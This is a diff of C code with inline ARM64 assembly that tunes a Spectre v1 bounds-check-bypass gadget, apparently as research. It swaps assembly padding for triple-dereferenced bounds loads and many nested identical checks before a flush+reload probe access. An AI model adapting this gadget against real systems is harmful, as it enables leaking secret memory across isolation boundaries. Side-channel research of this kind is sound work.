@@ -26,24 +26,51 @@ uint64_t counter = 0;
 
 void spectre_v1( size_t index) {
 
-	asm volatile(
-    	"ldr x10, %[counter]\n"
-		"mov x11, 2\n"
-        :: [counter] "m" (counter)
-    );
-	if (index < *index_p1)
+//	asm volatile(
+//    	"ldr x10, %[counter]\n"
+//		"mov x11, 2\n"
+//        :: [counter] "m" (counter)
+//    );
+	if (index < ***index_p3)
 	{	
-		asm volatile(
-			".rept 1134\n"                 
-		//	"adds x10, x10, x11\n"          //execution window 1135
-			"nop\n"							//execution window 1135
-		//	"sdiv x10, x10, x11\n"			//execution window 10
-			".endr\n"
-		);
 //		asm volatile(
-//			"ldr x12, [x10, ]"
+		//	".rept 1000\n"                 
+		//	"adds x10, x10, x11\n"          //execution window 1000
+		//	"nop\n"							//execution window 1134
+		//	"sdiv x10, x10, x11\n"			//execution window 4
+		//	"eor x10, x10, x11\n"
+		//	".endr\n"
 //		);
-		pick = reloadbuffer[fake_buffer[index] << 12];
+		if(index < ***index_p3)
+		{
+			if(index < ***index_p3){
+				if(index <***index_p3)
+				if(index <***index_p3)
+				if(index <***index_p3)
+				if(index <***index_p3)
+				if(index <***index_p3)
+				if(index <***index_p3)
+				if(index <***index_p3)
+				if(index <***index_p3)
+				if(index <***index_p3)
+				if(index <***index_p3)
+				if(index <***index_p3)
+				if(index <***index_p3)
+				if(index <***index_p3)
+				if(index <***index_p3)
+				if(index <***index_p3)
+				if(index <***index_p3)
+				if(index <***index_p3)
+				if(index <***index_p3)
+				if(index <***index_p3)
+				if(index <***index_p3)
+				if(index <***index_p3)
+				if(index <***index_p3)
+				if(index <***index_p3)
+				if(index <***index_p3)
+				pick = reloadbuffer[fake_buffer[index] << 12];
+			}
+		}
 	}
 }
 
